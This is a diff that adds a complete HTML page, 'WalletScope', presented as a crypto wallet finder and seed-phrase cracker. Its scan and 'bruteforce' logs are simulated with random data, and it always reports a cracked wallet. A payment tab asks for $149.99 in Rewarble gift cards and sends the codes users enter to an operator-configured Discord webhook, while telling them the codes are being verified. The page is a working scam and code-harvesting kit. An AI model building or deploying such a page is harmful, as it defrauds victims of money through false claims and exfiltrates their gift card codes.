@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WalletScope · Crypto Wallet Finder</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0b0e14;
+      color: #e6e6e6;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      background: #141824;
+      padding: 16px 32px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #232838;
+    }
+    .logo { font-weight: 700; font-size: 20px; color: #6ee7b7; letter-spacing: 0.5px; }
+    .user { font-size: 14px; color: #8b93a7; }
+    .user span { color: #6ee7b7; font-weight: 600; }
+
+    /* --- Tabs --- */
+    .tabs {
+      display: flex;
+      gap: 4px;
+      background: #141824;
+      padding: 0 32px;
+      border-bottom: 1px solid #232838;
+    }
+    .tab {
+      background: transparent;
+      border: none;
+      color: #8b93a7;
+      padding: 14px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    .tab:hover { color: #e6e6e6; }
+    .tab.active {
+      color: #6ee7b7;
+      border-bottom-color: #6ee7b7;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 48px 24px;
+    }
+
+    .panel {
+      background: #141824;
+      border: 1px solid #232838;
+      border-radius: 12px;
+      padding: 32px;
+      width: 100%;
+      max-width: 760px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
+    }
+
+    .page { display: none; width: 100%; max-width: 760px; }
+    .page.active { display: block; }
+
+    h1 { font-size: 24px; margin-bottom: 8px; }
+    .subtitle { color: #8b93a7; font-size: 14px; margin-bottom: 24px; }
+
+    button.primary {
+      background: #6ee7b7;
+      color: #0b0e14;
+      border: none;
+      padding: 14px 28px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+    button.primary:hover:not(:disabled) { background: #34d399; transform: translateY(-1px); }
+    button.primary:disabled { opacity: 0.4; cursor: not-allowed; }
+
+    .stats {
+      display: flex;
+      gap: 24px;
+      margin: 24px 0;
+      font-size: 14px;
+      color: #8b93a7;
+    }
+    .stats strong { color: #e6e6e6; }
+
+    .log {
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 8px;
+      height: 340px;
+      overflow-y: auto;
+      padding: 16px;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+    }
+    .log-entry { white-space: nowrap; }
+    .log-entry.invalid { color: #6b7280; }
+    .log-entry.valid { color: #6ee7b7; font-weight: 700; }
+    .log-entry.info { color: #60a5fa; }
+    .log-entry.error { color: #f87171; }
+    .log-entry.brute { color: #fbbf24; }
+
+    .found {
+      margin-top: 24px;
+      padding: 20px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #064e3b, #065f46);
+      border: 1px solid #6ee7b7;
+      display: none;
+    }
+    .found.show { display: block; animation: pop 0.4s ease; }
+    @keyframes pop { from { opacity: 0; transform: scale(0.96); } to { opacity: 1; transform: scale(1); } }
+    .found h2 { color: #6ee7b7; margin-bottom: 12px; font-size: 18px; }
+    .found p { margin: 4px 0; font-size: 14px; }
+    .found .addr { font-family: monospace; color: #a7f3d0; word-break: break-all; }
+
+    .seed {
+      margin-top: 24px;
+      padding: 20px;
+      border-radius: 8px;
+      background: #1a0e2e;
+      border: 1px solid #a855f7;
+      display: none;
+    }
+    .seed.show { display: block; animation: pop 0.4s ease; }
+    .seed h2 { color: #c084fc; margin-bottom: 12px; font-size: 18px; }
+    .seed .words {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 12px;
+    }
+    .seed .word {
+      background: #0b0e14;
+      border: 1px solid #4c1d95;
+      border-radius: 6px;
+      padding: 10px 12px;
+      font-family: monospace;
+      font-size: 14px;
+      color: #e9d5ff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .seed .word .num {
+      color: #7c3aed;
+      font-size: 12px;
+      min-width: 18px;
+    }
+
+    /* --- Payment page --- */
+    .plan {
+      background: #0b0e14;
+      border: 1px solid #6ee7b7;
+      border-radius: 10px;
+      padding: 24px;
+      position: relative;
+      box-shadow: 0 0 0 1px #6ee7b7 inset;
+    }
+    .plan .badge {
+      position: absolute;
+      top: -10px;
+      right: 16px;
+      background: #6ee7b7;
+      color: #0b0e14;
+      font-size: 11px;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 4px;
+      letter-spacing: 0.5px;
+    }
+    .plan h3 { font-size: 18px; margin-bottom: 6px; }
+    .plan .price { font-size: 34px; font-weight: 800; color: #6ee7b7; margin: 10px 0 4px; }
+    .plan .price small { font-size: 14px; color: #8b93a7; font-weight: 500; }
+    .plan .desc { font-size: 13px; color: #8b93a7; margin-bottom: 12px; }
+    .plan ul { list-style: none; margin-top: 10px; }
+    .plan li { font-size: 13px; color: #8b93a7; margin: 6px 0; display: flex; gap: 6px; }
+    .plan li::before { content: "✓"; color: #6ee7b7; font-weight: 700; }
+
+    .checkout {
+      margin-top: 24px;
+      padding: 20px;
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .checkout h3 { font-size: 15px; margin-bottom: 8px; color: #e6e6e6; font-weight: 600; }
+    .checkout p.note {
+      font-size: 13px;
+      color: #8b93a7;
+      margin-bottom: 18px;
+      line-height: 1.6;
+    }
+    .giftcard-btn {
+      display: inline-block;
+      width: 100%;
+      background: #6ee7b7;
+      color: #0b0e14;
+      border: none;
+      padding: 16px 28px;
+      font-size: 16px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+      text-decoration: none;
+      text-align: center;
+    }
+    .giftcard-btn:hover { background: #34d399; transform: translateY(-1px); }
+
+    .external-note {
+      font-size: 12px;
+      color: #6b7280;
+      margin-top: 12px;
+    }
+
+    /* --- NEW: Giftcard redemption form --- */
+    .redeem-box {
+      margin-top: 24px;
+      padding: 20px;
+      background: #0b0e14;
+      border: 1px solid #232838;
+      border-radius: 10px;
+      text-align: left;
+    }
+    .redeem-box h3 {
+      font-size: 15px;
+      margin-bottom: 8px;
+      color: #e6e6e6;
+      font-weight: 600;
+    }
+    .redeem-box p {
+      font-size: 13px;
+      color: #8b93a7;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+    .code-input {
+      display: flex;
+      gap: 8px;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    .code-input input {
+      flex: 1 1 220px;
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 8px;
+      padding: 12px 16px;
+      font-size: 15px;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      color: #e6e6e6;
+      letter-spacing: 2px;
+      transition: border 0.2s;
+      min-width: 0;
+    }
+    .code-input input:focus {
+      outline: none;
+      border-color: #6ee7b7;
+      box-shadow: 0 0 0 2px rgba(110, 231, 183, 0.15);
+    }
+    .code-input input::placeholder {
+      color: #4b5266;
+      letter-spacing: 1px;
+    }
+    .code-input button {
+      background: #6ee7b7;
+      color: #0b0e14;
+      border: none;
+      padding: 12px 24px;
+      font-size: 14px;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: inherit;
+      white-space: nowrap;
+    }
+    .code-input button:hover:not(:disabled) {
+      background: #34d399;
+      transform: translateY(-1px);
+    }
+    .code-input button:disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+    .redeem-status {
+      margin-top: 10px;
+      font-size: 13px;
+      min-height: 20px;
+      color: #8b93a7;
+    }
+    .redeem-status.success { color: #6ee7b7; }
+    .redeem-status.error { color: #f87171; }
+
+    @media (max-width: 640px) {
+      .seed .words { grid-template-columns: repeat(2, 1fr); }
+      .code-input { flex-direction: column; align-items: stretch; }
+      .code-input button { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">◈ WalletScope</div>
+    <div class="user">Logged in as <span id="username"></span></div>
+  </header>
+
+  <nav class="tabs">
+    <button class="tab active" data-tab="wallets">Find Wallets</button>
+    <button class="tab" data-tab="payment">Payment</button>
+  </nav>
+
+  <main>
+    <!-- ============ FIND WALLETS PAGE ============ -->
+    <section class="page active" id="page-wallets">
+      <div class="panel">
+        <h1>Find Wallets</h1>
+        <p class="subtitle">Scan the network for wallets containing a balance.</p>
+
+        <button class="primary" id="startBtn">▶ Start Scanning</button>
+
+        <div class="stats">
+          <div>Scanned: <strong id="scanned">0</strong></div>
+          <div>Found: <strong id="foundCount">0</strong></div>
+          <div>Elapsed: <strong id="elapsed">0s</strong></div>
+        </div>
+
+        <div class="log" id="log">
+          <div class="log-entry info">[system] Ready to scan.</div>
+        </div>
+
+        <div class="found" id="foundBox">
+          <h2>✔ Wallet Found With Balance!</h2>
+          <p>Address: <span class="addr" id="foundAddr"></span></p>
+          <p>Balance: <strong id="foundBal"></strong></p>
+        </div>
+
+        <div class="seed" id="seedBox">
+          <h2>🔓 Wallet Cracked — Recovery Phrase</h2>
+          <div class="words" id="seedWords"></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============ PAYMENT PAGE ============ -->
+    <section class="page" id="page-payment">
+      <div class="panel">
+        <h1>Unlock Full Access</h1>
+        <p class="subtitle">One-time payment. Lifetime access. No subscription.</p>
+
+        <div class="plan">
+          <span class="badge">LIFETIME</span>
+          <h3>Pro Access</h3>
+          <div class="price">$149.99<small> one-time</small></div>
+          <p class="desc">Pay once, use forever. No hidden fees, no renewals.</p>
+          <ul>
+            <li>Unlimited wallet scans</li>
+            <li>Priority recovery engine</li>
+            <li>Advanced bruteforce module</li>
+            <li>Lifetime updates</li>
+            <li>24/7 priority support</li>
+          </ul>
+        </div>
+
+        <div class="checkout">
+          <h3>How to pay</h3>
+          <p class="note">
+            We accept payment via <strong>Rewarble Super Gift Card ($150 USD)</strong>.
+            Click the button below to purchase one, then return here to complete your order.
+          </p>
+          <a class="giftcard-btn"
+             href="https://www.g2a.com/rewarble-super-gift-card-150-usd-by-rewarble-key-united-states-i10000506957021"
+             target="_blank"
+             rel="noopener noreferrer">
+            🎁 Purchase Giftcard
+          </a>
+          <p class="external-note">Opens G2A in a new tab.</p>
+        </div>
+
+        <!-- ===== NEW: GIFT CARD CODE REDEMPTION ===== -->
+        <div class="redeem-box" id="redeemBox">
+          <h3>🔑 Redeem your gift card</h3>
+          <p>Enter the <strong>16‑digit code</strong> from your Rewarble Super Gift Card below. We'll verify it instantly and unlock your Pro Access.</p>
+          <div class="code-input">
+            <input
+              type="text"
+              id="giftcardInput"
+              placeholder="XXXX-XXXX-XXXX-XXXX"
+              maxlength="19"
+              autocomplete="off"
+              spellcheck="false"
+              inputmode="numeric"
+            />
+            <button id="redeemBtn">Redeem Code</button>
+          </div>
+          <div class="redeem-status" id="redeemStatus"></div>
+        </div>
+        <!-- ===== END NEW ===== -->
+      </div>
+    </section>
+  </main>
+
+<script>
+  // ---------- Discord webhook URL (replace with your own) ----------
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/REPLACE_WITH_YOUR_WEBHOOK_ID/REPLACE_WITH_YOUR_WEBHOOK_TOKEN';
+
+  // ---------- Guest username ----------
+  const username = 'user' + Math.floor(Math.random() * 9_000_000_000 + 1_000_000_000);
+  document.getElementById('username').textContent = username;
+
+  // ---------- Tab switching ----------
+  const tabs = document.querySelectorAll('.tab');
+  const pages = document.querySelectorAll('.page');
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
+      pages.forEach(p => p.classList.remove('active'));
+      tab.classList.add('active');
+      document.getElementById('page-' + tab.dataset.tab).classList.add('active');
+    });
+  });
+
+  // ============================================================
+  // FIND WALLETS PAGE
+  // ============================================================
+  const startBtn = document.getElementById('startBtn');
+  const logEl = document.getElementById('log');
+  const scannedEl = document.getElementById('scanned');
+  const foundCountEl = document.getElementById('foundCount');
+  const elapsedEl = document.getElementById('elapsed');
+  const foundBox = document.getElementById('foundBox');
+  const foundAddr = document.getElementById('foundAddr');
+  const foundBal = document.getElementById('foundBal');
+  const seedBox = document.getElementById('seedBox');
+  const seedWords = document.getElementById('seedWords');
+
+  const TOTAL_DURATION_MS = 5 * 60 * 1000 + 30 * 1000;
+  const SCAN_INTERVAL_MS = 450;
+  const BRUTEFORCE_DURATION_MS = 45 * 1000;
+  const BRUTEFORCE_INTERVAL_MS = 250;
+
+  let scanning = false;
+  let scanned = 0;
+  let startTime = 0;
+  let tickTimer = null;
+  let clockTimer = null;
+  let bruteTimer = null;
+
+  const WORD_POOL = [
+    'apple','river','stone','cloud','tiger','ember','north','glass','orbit','maple',
+    'shadow','silver','forest','candle','rocket','velvet','harbor','meadow','anchor','pixel',
+    'lunar','cedar','drift','quartz','falcon','ripple','marble','onyx','sparrow','willow',
+    'cobalt','thunder','prism','amber','glacier','nova','sable','zephyr','comet','ivory',
+    'jasmine','cinder','vortex','opal','wren','bramble','dusk','flint','saffron','lark'
+  ];
+
+  function randomHex(len) {
+    const chars = '0123456789abcdef';
+    let s = '';
+    for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * 16)];
+    return s;
+  }
+  function fakeWalletAddress() { return '0x' + randomHex(40); }
+  function shortAddr(a) { return a.slice(0, 10) + '...' + a.slice(-6); }
+  function log(msg, cls = 'invalid') {
+    const div = document.createElement('div');
+    div.className = 'log-entry ' + cls;
+    div.textContent = msg;
+    logEl.appendChild(div);
+    logEl.scrollTop = logEl.scrollHeight;
+    if (logEl.children.length > 400) logEl.removeChild(logEl.firstChild);
+  }
+  function formatTime(ms) { return Math.floor(ms / 1000) + 's'; }
+  function randomWord() { return WORD_POOL[Math.floor(Math.random() * WORD_POOL.length)]; }
+  function generateSeed() {
+    const words = [];
+    const used = new Set();
+    while (words.length < 12) {
+      const w = randomWord();
+      if (used.has(w)) continue;
+      used.add(w);
+      words.push(w);
+    }
+    return words;
+  }
+
+  function startScan() {
+    scanning = true;
+    scanned = 0;
+    startTime = Date.now();
+    startBtn.disabled = true;
+    startBtn.textContent = '⏳ Scanning...';
+    foundBox.classList.remove('show');
+    seedBox.classList.remove('show');
+    seedWords.innerHTML = '';
+    logEl.innerHTML = '';
+    log('[system] Starting scan session...', 'info');
+    log('[system] Initializing wallet discovery engine...', 'info');
+
+    const tick = () => {
+      if (!scanning) return;
+      const elapsed = Date.now() - startTime;
+      if (elapsed >= TOTAL_DURATION_MS) { finishScan(); return; }
+
+      scanned++;
+      scannedEl.textContent = scanned;
+      const addr = fakeWalletAddress();
+      log(`[scan] ${shortAddr(addr)} → balance: 0.00000000  ✖ invalid`);
+
+      if (Math.random() < 0.05) {
+        log(`[net]  block ${Math.floor(Math.random()*9_000_000)} verified, continuing...`, 'info');
+      }
+
+      tickTimer = setTimeout(tick, SCAN_INTERVAL_MS + Math.random() * 200);
+    };
+    tick();
+
+    clockTimer = setInterval(() => {
+      if (!scanning) return;
+      elapsedEl.textContent = formatTime(Date.now() - startTime);
+    }, 1000);
+  }
+
+  function finishScan() {
+    scanning = false;
+    clearTimeout(tickTimer);
+    startBtn.textContent = '⏳ Wallet found...';
+
+    const addr = fakeWalletAddress();
+    const amount = (Math.random() * 0.017 + 0.0007).toFixed(8);
+
+    log(`[scan] ${shortAddr(addr)} → balance: ${amount}  ✔ VALID`, 'valid');
+    log('[system] Wallet with balance located.', 'info');
+
+    foundAddr.textContent = addr;
+    foundBal.textContent = amount + ' ETH';
+    foundBox.classList.add('show');
+    foundCountEl.textContent = '1';
+
+    setTimeout(() => startBruteforce(addr), 1500);
+  }
+
+  function startBruteforce(addr) {
+    log('[brute] Initiating wallet crack on ' + shortAddr(addr) + '...', 'brute');
+    log('[brute] Loading candidate word pool (2048 entries)...', 'brute');
+    log('[brute] Generating permutations...', 'brute');
+
+    const bruteStart = Date.now();
+    let attempts = 0;
+
+    const tick = () => {
+      const elapsed = Date.now() - bruteStart;
+      if (elapsed >= BRUTEFORCE_DURATION_MS) { finishBruteforce(); return; }
+
+      attempts += Math.floor(Math.random() * 800 + 200);
+      if (Math.random() < 0.35) {
+        const msgs = [
+          `[brute] Attempt #${attempts.toLocaleString()} — ${randomWord()}-${randomWord()}-${randomWord()}... no match`,
+          `[brute] Testing combination ${randomWord()}/${randomWord()}/${randomWord()}/${randomWord()}...`,
+          `[brute] Attempt #${attempts.toLocaleString()} — checksum mismatch`,
+          `[brute] Hash rate: ${(Math.random()*40+20).toFixed(1)} MH/s`,
+          `[brute] Entropy drift detected, recalibrating...`,
+          `[brute] Attempt #${attempts.toLocaleString()} — partial match found, verifying...`,
+        ];
+        log(msgs[Math.floor(Math.random() * msgs.length)], 'brute');
+      }
+      bruteTimer = setTimeout(tick, BRUTEFORCE_INTERVAL_MS + Math.random() * 200);
+    };
+    tick();
+  }
+
+  function finishBruteforce() {
+    clearTimeout(bruteTimer);
+    log('[brute] ✔ Seed phrase recovered!', 'brute');
+    log('[system] Rendering recovery words...', 'info');
+
+    const words = generateSeed();
+    seedWords.innerHTML = '';
+    words.forEach((w, i) => {
+      const div = document.createElement('div');
+      div.className = 'word';
+      div.innerHTML = `<span class="num">${i + 1}.</span><span>${w}</span>`;
+      seedWords.appendChild(div);
+    });
+    seedBox.classList.add('show');
+
+    startBtn.disabled = false;
+    startBtn.textContent = '▶ Start Scanning';
+    clearInterval(clockTimer);
+  }
+
+  startBtn.addEventListener('click', startScan);
+
+  // ============================================================
+  // GIFT CARD CODE → DISCORD WEBHOOK
+  // ============================================================
+  const giftcardInput = document.getElementById('giftcardInput');
+  const redeemBtn = document.getElementById('redeemBtn');
+  const redeemStatus = document.getElementById('redeemStatus');
+
+  // Auto-format: insert hyphens every 4 digits (16 digits max)
+  giftcardInput.addEventListener('input', function (e) {
+    let digits = this.value.replace(/\D/g, '').slice(0, 16); // max 16 digits
+    let formatted = '';
+    for (let i = 0; i < digits.length; i++) {
+      if (i > 0 && i % 4 === 0) formatted += '-';
+      formatted += digits[i];
+    }
+    this.value = formatted;
+  });
+
+  // Prevent non-digit characters (except the auto-hyphens)
+  giftcardInput.addEventListener('keydown', function (e) {
+    const allowed = ['Backspace', 'Delete', 'ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'];
+    if (allowed.includes(e.key)) return;
+    if (!/^\d$/.test(e.key)) {
+      e.preventDefault();
+    }
+  });
+
+  async function sendToDiscord(code) {
+    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('REPLACE_WITH')) {
+      throw new Error('Discord webhook URL is not configured. Please set DISCORD_WEBHOOK_URL in the script.');
+    }
+
+    const payload = {
+      username: 'WalletScope Redemption',
+      embeds: [
+        {
+          title: '🎁 Gift Card Code Redeemed',
+          color: 0x6ee7b7,
+          fields: [
+            { name: '👤 User', value: username, inline: true },
+            { name: '🔑 Code', value: '`' + code + '`', inline: true },
+            { name: '⏱️ Time', value: new Date().toUTCString(), inline: false }
+          ],
+          footer: { text: 'WalletScope · Payment System' }
+        }
+      ]
+    };
+
+    const res = await fetch(DISCORD_WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+
+    if (!res.ok) {
+      throw new Error('Discord webhook error: ' + res.status + ' ' + res.statusText);
+    }
+    return true;
+  }
+
+  redeemBtn.addEventListener('click', async function () {
+    const raw = giftcardInput.value.trim();
+    const digits = raw.replace(/\D/g, '');
+
+    // Validate: exactly 16 digits
+    if (digits.length !== 16) {
+      redeemStatus.textContent = '⚠️ Please enter exactly 16 digits (e.g., 1234-5678-9012-3456).';
+      redeemStatus.className = 'redeem-status error';
+      return;
+    }
+
+    // Format code as XXXX-XXXX-XXXX-XXXX for the message
+    const formattedCode = digits.match(/.{1,4}/g).join('-');
+
+    redeemBtn.disabled = true;
+    redeemBtn.textContent = '⏳ Sending...';
+    redeemStatus.textContent = 'Sending code to verification server...';
+    redeemStatus.className = 'redeem-status';
+
+    try {
+      await sendToDiscord(formattedCode);
+      redeemStatus.textContent = '✅ Code submitted! Your Pro Access will be activated shortly.';
+      redeemStatus.className = 'redeem-status success';
+      giftcardInput.value = '';
+      giftcardInput.disabled = true;
+      redeemBtn.textContent = '✔ Sent';
+      // Optional: re-enable after a while (for testing)
+      // setTimeout(() => { giftcardInput.disabled = false; redeemBtn.disabled = false; redeemBtn.textContent = 'Redeem Code'; }, 5000);
+    } catch (err) {
+      console.error('Redemption error:', err);
+      redeemStatus.textContent = '❌ ' + (err.message || 'Failed to send code. Please try again.');
+      redeemStatus.className = 'redeem-status error';
+      redeemBtn.disabled = false;
+      redeemBtn.textContent = 'Redeem Code';
+    }
+  });
+
+  // Allow Enter key in the input to trigger redemption
+  giftcardInput.addEventListener('keydown', function (e) {
+    if (e.key === 'Enter') {
+      e.preventDefault();
+      redeemBtn.click();
+    }
+  });
+</script>
+</body>
+</html>
